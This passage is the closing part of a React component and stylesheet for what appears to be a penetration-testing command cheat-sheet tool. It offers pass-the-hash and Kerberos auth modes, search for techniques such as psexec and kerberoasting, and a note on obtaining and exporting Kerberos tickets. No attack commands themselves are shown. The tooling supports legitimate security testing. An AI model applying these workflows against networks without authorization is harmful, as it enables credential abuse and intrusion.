          <div className="cc-auth">
            <span className="cc-authlbl">Auth</span>
            {[["pw","Password"],["hash","NTLM hash"],["krb","Kerberos"]].map(([k,l]) => (
              <button key={k} className={authMode === k ? "on" : ""} onClick={() => setAuthMode(k)}>{l}</button>
            ))}
          </div>

          <div className="cc-svc">
            <span className="cc-authlbl">Service</span>
            <select value={service} onChange={(e) => { setService(e.target.value); setFilter(""); }}>
              {order.map((id) => (
                <option key={id} value={id}>{services[id].name}{services[id].port !== "—" && services[id].port !== "core" ? `  ·  ${services[id].port}` : ""}</option>
              ))}
            </select>
          </div>

          <input className="cc-filter" value={filter} placeholder="search ALL services… (psexec, kerberoast, snmpwalk)" onChange={(e) => setFilter(e.target.value)} spellCheck={false} />
        </div>

        {authMode === "krb" && (
          <div className="cc-note">
            Kerberos mode: commands use the <b>hostname</b>, not the IP. Set <code>/etc/hosts</code> (Setup service),
            request a ticket with <code>getTGT</code>, then <code>export KRB5CCNAME={U}.ccache</code> before running.
          </div>
        )}
      </div>

      <div className="cc-sections">
        {view.map(({ id, svc, groups }) => (
          <div key={id} className="cc-svcblock">
            {fil && <div className="cc-svcname">{svc.name}<span>{svc.port}</span></div>}
            {groups.map((g) => {
              const gk = id + "|" + g.phase;
              const isOpen = !collapsed[gk];
              return (
                <section key={gk} className="cc-section">
                  <button className="cc-phase" onClick={() => toggle(gk)}>
                    <span className={"cc-caret" + (isOpen ? " open" : "")}>▸</span>
                    {g.phase}
                    <span className="cc-count">{g.cmds.length}</span>
                  </button>
                  {isOpen && (
                    <div className="cc-cmds">
                      {g.cmds.map((c, i) => {
                        const key = gk + i;
                        return (
                          <div key={key} className="cc-cmd" onClick={() => doCopy(c.cmd, key)} title="Click to copy">
                            <div className="cc-cmdlabel">{c.label}</div>
                            <code className="cc-cmdtext">{renderCmd(c.cmd)}</code>
                            <span className={"cc-copy" + (copied === key ? " done" : "")}>{copied === key ? "copied" : "copy"}</span>
                          </div>
                        );
                      })}
                    </div>
                  )}
                </section>
              );
            })}
          </div>
        ))}
        {!view.length && <div className="cc-empty">No commands match “{filter}”.</div>}
      </div>

      <footer className="cc-foot">Amber tokens like <span className="ph">&lt;IP&gt;</span> are values you haven't set yet.</footer>
    </div>
  );
}

const CSS = `
.cc-root{--bg:#0f1218;--panel:#161b24;--panel2:#1b212c;--bd:#28303d;--tx:#d7dde6;--dim:#8a94a6;--amber:#f0a830;--cyan:#56b6c2;--ok:#7ec699;
  background:var(--bg);color:var(--tx);min-height:100vh;padding:28px 20px 60px;
  font-family:ui-monospace,"JetBrains Mono","SF Mono",Menlo,Consolas,monospace;}
.cc-head{max-width:1100px;margin:0 auto 18px;}
.cc-title{font-size:24px;font-weight:700;letter-spacing:.3px;display:flex;align-items:center;gap:10px;}
.cc-mark{color:var(--amber);background:#20262f;padding:2px 8px;border-radius:6px;font-weight:700;}
.cc-sub{color:var(--dim);font-size:13px;margin-top:6px;}
.cc-panel{max-width:1100px;margin:0 auto 22px;background:var(--panel);border:1px solid var(--bd);border-radius:12px;padding:18px;position:sticky;top:12px;z-index:5;box-shadow:0 8px 30px rgba(0,0,0,.35);}
.cc-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;}
.cc-field{display:flex;flex-direction:column;gap:5px;font-size:12px;}
.cc-field.cc-wide{grid-column:span 4;}
.cc-field span{color:var(--dim);text-transform:uppercase;letter-spacing:.6px;font-size:10.5px;}
.cc-field input{background:var(--panel2);border:1px solid var(--bd);border-radius:7px;color:var(--tx);padding:9px 10px;font:inherit;font-size:13px;outline:none;transition:border-color .12s;}
.cc-field input:focus{border-color:var(--amber);}
.cc-field input::placeholder{color:#566275;}
.cc-row{display:flex;gap:14px;align-items:center;margin-top:14px;flex-wrap:wrap;}
.cc-auth,.cc-svc{display:flex;align-items:center;gap:6px;}
.cc-authlbl{color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:.6px;margin-right:2px;}
.cc-auth button{background:var(--panel2);border:1px solid var(--bd);color:var(--dim);padding:8px 13px;border-radius:7px;font:inherit;font-size:12.5px;cursor:pointer;transition:all .12s;}
.cc-auth button:hover{color:var(--tx);border-color:#3a4452;}
.cc-auth button.on{background:var(--amber);color:#1a1205;border-color:var(--amber);font-weight:700;}
.cc-svc select{background:var(--panel2);border:1px solid var(--bd);color:var(--tx);padding:8px 12px;border-radius:7px;font:inherit;font-size:13px;outline:none;cursor:pointer;}
.cc-svc select:focus{border-color:var(--amber);}
.cc-filter{flex:1;min-width:220px;background:var(--panel2);border:1px solid var(--bd);border-radius:7px;color:var(--tx);padding:9px 12px;font:inherit;font-size:13px;outline:none;}
.cc-filter:focus{border-color:var(--cyan);}
.cc-filter::placeholder{color:#566275;}
.cc-note{margin-top:14px;background:#1d2330;border:1px solid #3a3320;border-radius:8px;padding:10px 12px;font-size:12.5px;color:#e9d9b6;line-height:1.6;}
.cc-note code{background:#0d1117;padding:1px 6px;border-radius:4px;color:var(--amber);}
.cc-sections{max-width:1100px;margin:0 auto;display:flex;flex-direction:column;gap:10px;}
.cc-svcblock{display:flex;flex-direction:column;gap:10px;}
.cc-svcname{font-size:13px;color:var(--cyan);text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:10px;display:flex;gap:10px;align-items:baseline;}
.cc-svcname span{color:var(--dim);font-size:11px;letter-spacing:.5px;}
.cc-section{background:var(--panel);border:1px solid var(--bd);border-radius:10px;overflow:hidden;}
.cc-phase{width:100%;text-align:left;background:transparent;border:0;color:var(--amber);font:inherit;font-size:12px;text-transform:uppercase;letter-spacing:1px;font-weight:700;padding:12px 14px;cursor:pointer;display:flex;align-items:center;gap:9px;}
.cc-phase:hover{background:var(--panel2);}
.cc-caret{display:inline-block;transition:transform .15s;color:var(--dim);}
.cc-caret.open{transform:rotate(90deg);}
.cc-count{margin-left:auto;color:var(--dim);font-weight:600;font-size:11px;background:var(--panel2);padding:1px 8px;border-radius:10px;}
.cc-cmds{display:flex;flex-direction:column;gap:8px;padding:4px 12px 14px;}
.cc-cmd{position:relative;background:var(--panel2);border:1px solid var(--bd);border-left:3px solid #2f3947;border-radius:8px;padding:10px 78px 10px 13px;cursor:pointer;transition:border-color .12s,background .12s;}
.cc-cmd:hover{border-left-color:var(--amber);}
.cc-cmdlabel{color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px;}
.cc-cmdtext{display:block;white-space:pre-wrap;word-break:break-all;font-size:13px;line-height:1.55;color:#e6ebf2;}
.ph{color:var(--amber);background:rgba(240,168,48,.1);padding:0 3px;border-radius:3px;font-weight:600;}
.cc-copy{position:absolute;top:10px;right:10px;font-size:11px;color:var(--dim);background:var(--panel);border:1px solid var(--bd);padding:3px 9px;border-radius:5px;transition:all .12s;}
.cc-cmd:hover .cc-copy{color:var(--tx);border-color:#3a4452;}
.cc-copy.done{color:#1a1205;background:var(--ok);border-color:var(--ok);font-weight:700;}
.cc-empty{max-width:1100px;margin:30px auto;color:var(--dim);text-align:center;}
.cc-foot{max-width:1100px;margin:30px auto 0;color:var(--dim);font-size:12px;text-align:center;}
.cc-foot .ph{font-size:12px;}
@media(max-width:760px){.cc-grid{grid-template-columns:repeat(2,1fr);}.cc-field.cc-wide{grid-column:span 2;}.cc-panel{position:static;}}
@media(prefers-reduced-motion:reduce){*{transition:none!important;}}
`;
